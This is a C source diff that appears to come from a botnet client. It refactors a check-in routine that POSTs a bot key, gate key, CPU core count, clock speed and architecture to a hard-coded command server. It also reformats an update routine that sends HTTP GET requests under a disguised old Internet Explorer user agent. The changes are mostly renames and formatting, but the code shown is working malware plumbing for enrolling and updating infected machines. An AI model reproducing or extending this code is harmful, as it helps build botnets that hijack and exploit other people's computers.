@@ -93,8 +93,9 @@ static inline __attribute__((always_inline)) uint16_t _mhz() // Getz CPU speed i
 	return 0;
 }
 
-// Why the fuck does static inline work but inline on its own not work?
+// Why does static inline work but inline on its own not work?
 // Gotta look this up when I get back on wifi
+
 static inline __attribute__((always_inline)) uint8_t _bit(void) // Gets 32 or 64 bit arch
 {
 	if ((size_t) -1 > 0xffffffffUL)
@@ -145,28 +146,34 @@ static inline __attribute__((always_inline)) void processRecv(char *data)
 
 bool comm_comm(void)
 {
-	printd("POSTing...") char *reply   = calloc(2048, sizeof(char *)),
-							   *message = calloc(1024, sizeof(char *)), *postreq;
-	int		       sock, postlen;
+	printd("POSTing")
+	char *reply = calloc(2048, sizeof(char *)), *message = calloc(1024, sizeof(char *)), *postreq;
+	int sock, postlen;
 	struct sockaddr_in server;
 
-	server.sin_addr.s_addr = inet_addr(SERVER_ADRESS);
-	server.sin_family      = AF_INET;
-	server.sin_port	= htons(SERVER_PORT);
+	server.sin_addr.s_addr = inet_addr(COMM_ADDR);
+	server.sin_family = AF_INET;
+	server.sin_port  = htons(COMM_PORT);
 
 	// Create and connect
-	if (((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) ||
-			(connect(sock, (struct sockaddr *) &server, sizeof(server)) < 0))
+	if (((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) || (connect(sock, (struct sockaddr *) &server, sizeof(server)) < 0))
 		return false;
 
 	int fsize = asprintf(
 					&postreq,
 					"bkey=%s&key=%s&cores=%d&mhz=%d&bogus=%d&version=%s&arch=%d&arch2=%s",
-					comminfo.botkey, GATE_KEY, comminfo.cores, comminfo.mhz, comminfo.bogos,
-					VERSION, comminfo.bit, comminfo.arch);
+					comminfo.botkey,
+					COMM_KEY,
+					comminfo.cores,
+					comminfo.mhz,
+					comminfo.bogos,
+					MAIN_VERSION,
+					comminfo.bit,
+					comminfo.arch);
 	if (fsize == -1)
 	{
-		printd("Error creating postreq") goto failure2;
+		printd("Error creating postreq")
+		goto failure2;
 	}
 	postlen = strlen(postreq);
 
@@ -215,14 +222,15 @@ failure2:
 bool _update(char *url, char *site)
 {
 	char *msg;
-	int   size = asprintf(
-					 &msg, "GET /%s HTTP/1.1"
-					 "User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)"
-					 "Host: %s"
-					 // "Accept-Language: en-us"
-					 // "Accept-Encoding: gzip, deflate"
-					 "Connection: Keep-Alive",
-					 url, site);
+	int size = asprintf(&msg,
+			"GET /%s HTTP/1.1"
+			"User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)"
+			"Host: %s"
+			// "Accept-Language: en-us"
+			// "Accept-Encoding: gzip, deflate"
+			"Connection: Keep-Alive",
+			url,
+			site);
 	if (size == -1)
 		return false;
 
